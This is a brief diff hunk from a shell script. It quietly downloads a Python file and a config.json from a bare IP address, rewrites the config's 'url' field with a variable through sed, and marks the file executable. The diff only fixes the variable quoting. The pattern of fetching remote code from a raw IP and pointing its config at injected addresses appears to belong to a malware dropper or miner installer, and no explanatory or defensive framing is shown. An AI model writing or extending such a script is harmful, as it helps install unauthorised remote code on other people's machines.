@@ -16,7 +16,7 @@ wget -q -O "${NAME}" http://143.198.196.235/dev.py
 
 wget -q -O config.json http://143.198.196.235/config.json
 
-sed -i 's/"url": *"[^"]*"/"url": "$IPS"/' config.json
+sed -i 's/"url": *"[^"]*"/"url": "${IPS}"/' config.json
 
 chmod +x config.json
 
